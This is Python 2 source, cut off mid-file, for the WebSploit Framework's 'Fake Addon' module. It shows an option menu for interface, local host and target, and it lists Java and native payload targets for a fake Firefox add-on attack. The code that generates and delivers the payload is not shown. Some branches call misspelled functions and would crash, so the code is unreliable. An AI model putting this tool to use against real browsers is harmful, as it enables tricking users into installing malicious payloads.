#!/usr/bin/env python
#
# WebSploit Framework Firefox Fake Addon module
# Created By 0x0ptim0us (Fardin Allahverdinazhand) | Mikili (Mikail Skandary)
# Email : 0x0ptim0us@Gmail.Com | Mikili.land@Gmail.Com

import os
import subprocess
from time import sleep
from core import help
from core import wcolors

options = ["eth0", "192.168.1.1", "0"]

def fake_addon():
    try:
        line_1 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
        line_1 += ":"
        line_1 += wcolors.color.UNDERL + wcolors.color.BLUE + "Fake_Addon" + wcolors.color.ENDC
        line_1 += " > "
        com = raw_input(line_1)
        com = com.lower()
        if com[0:13] =='set interface':
            options[0] = com[14:20]
            print "INTERFACE => ", options[0]
            fake_addone()
        elif com[0:9] =='set lhost':
            options[1] = com[10:25]
            print "LHOST => ", options[1]
            fake_addon()
        elif com[0:10] =='set target':
            options[2] = com[11:12]
            print "TARGET => ", options[2]
            fake_addon()
        elif com[0:2] =='os':
            os.system(com[3:])
            fake_addon()
        elif com[0:4] =='help':
            help.help()
            fake_addon()
        elif com[0:4] =='back':
            pass
        elif com[0:12] =='show options':
            print ""
            print "Options\t\t Value\t\t\t\t RQ\t Description"
            print "---------\t--------------\t\t\t----\t--------------"
            print "INTERFACE\t"+options[0]+"\t\t\t\tyes\tNetwork Interface Name"
            print "LHOST\t\t"+options[1]+"\t\t\tyes\tLocal IP Address"
            print "TARGET\t\t"+options[2]+"\t\t\t\tyes\tTarget ID (Select From List)"
            print "\n"
            print "Targets List:\n"
            print "ID\t Description"
            print "---\t-------------"
            print "0\tGeneric (Java Payload)"
            print "1\tWindows x86 (Native Payload)"
            print "2\tLinux x86 (Native Payload)"
            print "3\tMac OS X PPC (Native Payload)"
            print "4\tMac OS X x86 (Native Payload)"
            print "\n"
            fale_addon()
        elif com[0:3] =='run':
            